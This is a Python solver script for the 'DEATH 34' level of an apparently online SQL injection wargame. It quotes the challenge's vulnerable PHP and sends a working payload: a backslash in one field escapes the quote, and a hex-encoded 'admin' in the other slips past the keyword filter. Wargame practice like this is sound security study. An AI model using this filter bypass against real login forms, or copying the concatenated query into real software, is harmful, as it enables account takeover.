#!/usr/bin/env python3
import los
import los_cookies as lc


def main():
    '''
    DEATH 34

    if(preg_match('/prob|_|\.|\(\)|admin/i', $_GET[id])) exit("No Hack ~_~"); 
    if(preg_match('/prob|_|\.|\(\)|admin/i', $_GET[pw])) exit("No Hack ~_~"); 
    $query = "select id from prob_death where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
    if($result['id'] == 'admin') solve("death");
    elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>"; 
    '''

    url = "https://modsec.rubiya.kr/chall/death_0128e8a86066ca4f148444f0e99f4707.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'pw'
    other_param = {'id': '\\'}

    payload = '||id=0x61646d696e#'
    p = los.SqlInjection(url, cook, method, inj_param, payload, other_param=other_param)
    response = p.my_request()
    if 'Clear!' in response:
        print('\nDEATH Clear!')


if __name__ == '__main__':
    main()

